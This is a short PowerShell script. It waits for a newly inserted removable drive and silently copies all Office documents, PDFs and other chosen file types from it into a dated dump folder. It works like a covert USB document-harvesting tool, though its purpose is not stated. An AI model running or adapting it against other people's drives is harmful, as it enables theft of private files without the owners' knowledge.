param(
    [Parameter(Mandatory=$True)]
    [string]$OutDir,
    [Parameter(Mandatory=$True)]
    [string[]]$FileType
)
$fileList = ('*.docx', '*.pptx', '*.xlsx', '*.pdf', '*.doc', '*.ppt', '*.xls')
foreach ($item in $FileType)
    {
        $fileList += $item
    }
$USBDrive
$state = 0
$DateTime = Get-Date
$dumpdir = $OutDir + $($DateTime.DayOfWeek) + " " + $($DateTime.Day) + "-" + $($DateTime.Month) + "-" + $($DateTime.Year)
# https://msdn.microsoft.com/en-us/library/aa394515(v=vs.85).aspx
$DriveList = Get-WmiObject Win32_Volume -Filter "DriveType='2'"|select -expand driveletter

# Script waits until detection of USB Drive Type 2 (Type 2 indicates removable storage)

while ($state -lt 1)
    {
        if ($USBDrive -lt 1)
            {
                $Compare = Get-WmiObject Win32_Volume -Filter "DriveType='2'"|select -expand driveletter
                foreach ($item in $Compare)
                    {
                        if ($DriveList -notcontains $item)
                            {
                                $USBDrive = $item
                            }
                    } 
            }
        else
            {
                $state = 1
            }
    }

# Script searches removable storage detected in previous code block for key file types and dumps to folder, followed by resetting all states and counters

while ($state -gt 0)
    {   
        if (!(Test-Path $dumpdir))
            {
                New-Item $dumpdir -ItemType Directory
            }      
        Get-ChildItem $USBDrive -Recurse -Include $fileList | Foreach-Object `
            {
                Copy-Item $_ -Destination $dumpdir
            }     
        $state = 0
        $USBDrive = ""
    }